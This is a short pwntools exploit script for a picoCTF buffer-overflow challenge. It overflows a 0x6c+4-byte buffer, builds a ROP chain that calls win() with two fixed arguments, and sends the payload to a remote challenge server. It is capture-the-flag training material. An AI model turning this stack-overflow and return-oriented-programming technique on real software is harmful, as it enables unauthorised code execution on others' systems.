from pwn import *

context.binary = elf = ELF('vuln3', checksec=True)

rop = ROP(elf)
rop.win(0xCAFEF00D, 0xF00DF00D)  # call win() with the 2 arguments


offset_to_fill = 0x6c+4  # address of the variable to overflow + 4 instruction pointer
io = remote('saturn.picoctf.net', 54267)
payload = b'A' * offset_to_fill + rop.chain()  # fill up the stuff first before overflowing to the return pointer, where we override it with win() call and its arguments
io.sendline(payload)
io.interactive()
